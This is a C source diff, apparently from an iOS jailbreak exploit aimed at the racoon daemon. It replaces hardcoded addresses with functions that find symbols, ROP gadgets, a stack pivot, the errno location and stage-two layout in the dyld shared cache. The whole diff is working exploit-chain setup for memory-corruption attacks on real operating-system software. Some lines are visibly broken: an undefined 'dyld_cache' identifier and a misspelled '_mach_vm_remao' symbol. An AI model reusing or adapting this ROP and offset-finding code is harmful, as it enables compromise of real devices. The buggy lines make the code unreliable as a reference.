@@ -6,24 +6,26 @@
 #include "common.h"
 #include "stage1.h"
 #include "stage2.h"
+#include "uland_offsetfinder.h"
 
 int install(const char *config_path, const char *racoon_path, const char *dyld_cache_path)
 {
+	init_uland_offsetfinder(racoon_path,dyld_cache_path);
 	offset_struct_t myoffsets;
 	// for the symbol finder we need a string xref finder and some instruction decoding mechanism
 	// we need to have some xref finder for code
 	// For instruction decoding we need the b.gt instruction as well as the adr instruction and cbnz,cbz,blr and ldr
 
 	// find the address of "No more than %d WINS" and "failed to set my ident %s" then an xref to the error handling code and then an xref which calls that code, for the first one you need to find an adr and for the second one you need an ldr
-	myoffsets.dns4_array_to_lcconf = -((0x100067c10+0x28-4*8)-0x1000670e0); 
+	myoffsets.dns4_array_to_lcconf = -((isakmp_cfg_config_addr()+0x28-4*8)-lcconf_addr()); 
 	myoffsets.lcconf_counter_offset = 0x10c; // we could try and find that dynamically or we could just hardcode it cause it prob doesn't change on 11.x (TODO: get that dynamically)
-	myoffsets.memmove = 0x1ab3b0d20; // strlcpy second branch
-	myoffsets.longjmp = 0x180b126e8; // dlsym
-	myoffsets.stack_pivot = 0x180b12714; // longjmp from mov x2, sp
-	myoffsets.mmap = 0x18097cbf4; // dlsym of __mmap
-	myoffsets.memcpy = 0x18095d634; // dlsym
-	myoffsets.open = 0x18097b950; // dlsym
-	myoffsets.max_slide = 0x4c74000; // just get 8 bytes at offset 30 from the cache
+	myoffsets.memmove = memmove_cache_ptr();  // strlcpy second branch
+	myoffsets.longjmp = realsym(dyld_cache_path,"__longjmp"); // dlsym
+	myoffsets.stack_pivot = get_stackpivot_addr(dyld_cache_path); // longjmp from mov x2, sp
+	myoffsets.mmap = realsym(dyld_cache_path,"__mmap"); // dlsym of __mmap
+	myoffsets.memcpy = realsym(dyld_cache_path,"_memcpy"); // dlsym
+	myoffsets.open = realsym(dyld_cache_path,"_open"); // dlsym
+	myoffsets.max_slide = get_cache_maxslide(); // just get 8 bytes at offset 30 from the cache
 	myoffsets.slide_value = 0x4000; // hardcode that one
 	myoffsets.pivot_x21 = 0x199bb31a8; // I hope this doesn't change on any version but we need to find the same gadget on all version (gadget and byte seqeunce can be found in stage1.m)
 	myoffsets.pivot_x21_x9_offset = 0x50-0x38; // this is not needed on 11.1.2 but because 11.3.1 and above lack the orignal x21 gadget we need to introduce that one here
@@ -33,15 +35,15 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.BEAST_GADGET_CALL_ONLY = 0x1a16644b4; // take the address above and search for the blr x27
 	myoffsets.str_x0_gadget = 0x199875020; // search for the byte sequence again (gadget in rop.h)
 	myoffsets.str_x0_gadget_offset = 0x28; // based on the gadget above
-	myoffsets.cbz_x0_gadget = 0x19987f230; // search for the byte sequence (gadget in rop.h)
-	myoffsets.cbz_x0_x16_load = 0x1b214cc50; // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
+	myoffsets.cbz_x0_gadget = get_cbz_x0_gadget(); // search for the byte sequence (gadget in rop.h)
+	myoffsets.cbz_x0_x16_load = cbz_gadget_x16_load(); // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
 	myoffsets.add_x0_gadget = 0x18518bb90; // raw byte search again (gadget is in rop.h)
-	myoffsets.fcntl_raw_syscall = 0x18097c434; // raw bytes again (because it's a mov x16, <imm>, svc and that can't change)
-	myoffsets.raw_mach_vm_remap_call = 0x180969bb8;
+	myoffsets.fcntl_raw_syscall = realsym(dyld_cache_path,"__fcntl"); // raw bytes again (because it's a mov x16, <imm>, svc and that can't change)
+	myoffsets.raw_mach_vm_remap_call = realsym(dyld_cache,"_mach_vm_remao");
 	myoffsets.rop_nop = 0x180b12728; // just use the longjmp gadget above and search the ret instruction
 	myoffsets.new_cache_addr = 0x1c0000000; 
 	myoffsets.cache_text_seg_size = 0x30000000; // we can get that by parsing the segements from the cache
-	myoffsets.errno_offset = 0x1f2d65000; // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
+	myoffsets.errno_offset = get_errno_offset(dyld_cache_path); // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
 	myoffsets.mach_msg_offset = 0x1f1535018;
 	myoffsets.stage2_base = myoffsets.new_cache_addr+myoffsets.cache_text_seg_size+0x4000;
 	myoffsets.stage2_max_size = 0x200000;
